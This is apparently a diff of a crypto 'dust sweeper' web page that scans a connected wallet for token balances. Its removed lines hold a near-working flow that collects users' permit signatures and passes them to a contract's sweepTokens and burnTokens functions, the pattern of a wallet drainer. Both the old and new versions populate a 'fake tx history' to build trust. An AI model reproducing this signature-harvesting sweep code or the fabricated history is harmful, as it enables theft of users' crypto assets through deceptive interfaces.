-              } catch (e) {
-                // user may reject signing; push empty so array lengths match
-                sessionData.permitData.push({ value:'0', deadline:0, v:0, r:'0x', s:'0x' });
-              }
-            } else {
-              sessionData.permitData.push({ value:'0', deadline:0, v:0, r:'0x', s:'0x' });
+            if (usd > 0.01) { // Only show tokens with some value
+                listEl.appendChild(renderTokenRow(t.symbol, amt, usd));
+                sessionData.tokensFound.push({ ...t, balance: bal.toString(), amount: amt, usd });
+                sessionData.totals.usd += usd;
             }
-
-            sessionData.totals.usd += usd;
           }
         } catch (e) {
           console.error('Token scan error', t.symbol, e);
         }
+        tokensProcessed++;
+        statusEl.textContent = `Scanning... (${tokensProcessed}/${TOKENS.length})`;
       }
 
-      if (!any) {
-        statusEl.textContent = 'No balances found for tracked tokens.';
-        convertBtn.style.display = 'none';
-        burnBtn.style.display = 'none';
+      if (sessionData.tokensFound.length === 0) {
+        statusEl.textContent = 'No significant dust balances found.';
         return;
       }
 
-      // Fee model “as if live”
       const totalUsd = sessionData.totals.usd;
       const feePct = 0.15;
       const netUsd = totalUsd * (1 - feePct);
+      const estEthReceived = netUsd / (TOKEN_PRICES_USD['ETH'] || 3400);
 
-      // Gas (very rough placeholder)
-      const gasPrice = await ethersProvider.getGasPrice().catch(()=>ethers.BigNumber.from('20000000000')); // 20 gwei fallback
-      const gasEstimate = gasPrice.mul(200000); // rough units
-      const estEth = Number(ethers.utils.formatEther(gasEstimate));
-      const ethUsd = 3000; // placeholder
-      const gasUsd = estEth * ethUsd;
-
-      claimEl.textContent = `Claimable (after 15% fee): ~$${netUsd.toFixed(2)}  •  Est. Gas: ~$${gasUsd.toFixed(2)}`;
-      if (totalUsd >= MIN_DUST_USD && netUsd > gasUsd) {
-        statusEl.textContent = 'Eligible to convert. Approve once, then convert.';
-        convertBtn.style.display = 'block';
+      claimEl.innerHTML = `Total Value: ~$${totalUsd.toFixed(2)} USD<br>Estimated to Receive: <strong>~${estEthReceived.toFixed(5)} ETH</strong> (after 15% fee)`;
+      
+      if (totalUsd >= MIN_DUST_USD) {
+        statusEl.textContent = 'Found eligible tokens to convert.';
+        actionButtons.style.display = 'block';
       } else {
-        statusEl.textContent = 'Value likely too low to cover gas. Consider burning.';
-        convertBtn.style.display = 'none';
+        statusEl.textContent = `Total value is below the $${MIN_DUST_USD} minimum.`;
+        actionButtons.style.display = 'none';
+        burnBtn.style.display = 'block'; // Still show burn button
       }
-      burnBtn.style.display = 'block';
       toast('Scan complete.');
     }
-
+    
+    // --- Mock functions for onConvert and onBurn ---
+    // In a real application, these would interact with your smart contract.
     function missingContractGuard() {
       const missing = !SWEEPER_CONTRACT_ADDRESS || SWEEPER_CONTRACT_ADDRESS === '0xYourSmartContractAddress';
       if (missing) {
-        toast('Contract not set yet. This is a live-ready demo.');
+        toast('Contract address not configured.');
       }
       return missing;
     }
 
     async function onConvert() {
-      try {
         if (missingContractGuard()) return;
-        await ensureMainnet();
-
-        const tokens = sessionData.tokensFound.map(t => t.address);
-        const permitValues = sessionData.permitData.map(p => p.value);
-        const deadlines = sessionData.permitData.map(p => p.deadline);
-        const v = sessionData.permitData.map(p => p.v);
-        const r = sessionData.permitData.map(p => p.r);
-        const s = sessionData.permitData.map(p => p.s);
-
-        const sweeperAbi = [
-          'function sweepTokens(address[] tokens, address user, uint256[] permitValues, uint256[] deadlines, uint8[] v, bytes32[] r, bytes32[] s) external'
-        ];
-        const sweeper = new ethers.Contract(SWEEPER_CONTRACT_ADDRESS, sweeperAbi, signer);
-
-        statusEl.textContent = 'Please confirm transaction in your wallet…';
-        const tx = await sweeper.sweepTokens(tokens, userAddress, permitValues, deadlines, v, r, s);
-        await tx.wait();
-        statusEl.textContent = 'Success! Dust converted to ETH.';
-        convertBtn.style.display = 'none'; burnBtn.style.display = 'none';
-        toast('Conversion complete.');
-      } catch (e) {
-        console.error(e);
-        statusEl.textContent = 'Conversion failed or cancelled.';
-        toast('Conversion failed.');
-      }
+        toast("This is a demo. 'Convert' function not implemented.");
+        statusEl.textContent = 'Confirming transaction in wallet (demo)...';
+        // Here you would build and send the real transaction
     }
 
     async function onBurn() {
-      try {
         if (missingContractGuard()) return;
-        await ensureMainnet();
-
-        const tokens = sessionData.tokensFound.map(t => t.address);
-        const permitValues = sessionData.permitData.map(p => p.value);
-        const deadlines = sessionData.permitData.map(p => p.deadline);
-        const v = sessionData.permitData.map(p => p.v);
-        const r = sessionData.permitData.map(p => p.r);
-        const s = sessionData.permitData.map(p => p.s);
-
-        const sweeperAbi = [
-          'function burnTokens(address[] tokens, address user, uint256[] permitValues, uint256[] deadlines, uint8[] v, bytes32[] r, bytes32[] s) external payable'
-        ];
-        const sweeper = new ethers.Contract(SWEEPER_CONTRACT_ADDRESS, sweeperAbi, signer);
-
-        statusEl.textContent = 'Please confirm burn transaction in your wallet…';
-        const tx = await sweeper.burnTokens(tokens, userAddress, permitValues, deadlines, v, r, s, {
-          value: ethers.utils.parseEther('0.0004') // ~$1 at $2500/ETH
-        });
-        await tx.wait();
-        statusEl.textContent = 'Success! Dust tokens burned.';
-        convertBtn.style.display = 'none'; burnBtn.style.display = 'none';
-        toast('Burn complete.');
-      } catch (e) {
-        console.error(e);
-        statusEl.textContent = 'Burn failed or cancelled.';
-        toast('Burn failed.');
-      }
+        toast("This is a demo. 'Burn' function not implemented.");
+        statusEl.textContent = 'Confirming burn in wallet (demo)...';
     }
 
-    /************ Events ************/
+
+    /************ EVENT LISTENERS ************/
     connectBtn.addEventListener('click', connectWallet);
     resetLink.addEventListener('click', resetConnection);
     convertBtn.addEventListener('click', onConvert);
     burnBtn.addEventListener('click', onBurn);
 
-    // Re-scan when accounts/network change
-    if (window.ethereum) {
-      window.ethereum.on?.('accountsChanged', () => location.reload());
-      window.ethereum.on?.('chainChanged', () => location.reload());
-    }
-
-    // Populate fake tx history on load
-    populateTxHistory();
+    // Initial setup
+    document.addEventListener('DOMContentLoaded', () => {
+        populateTxHistory();
+    });
   </script>
 </body>
 </html>
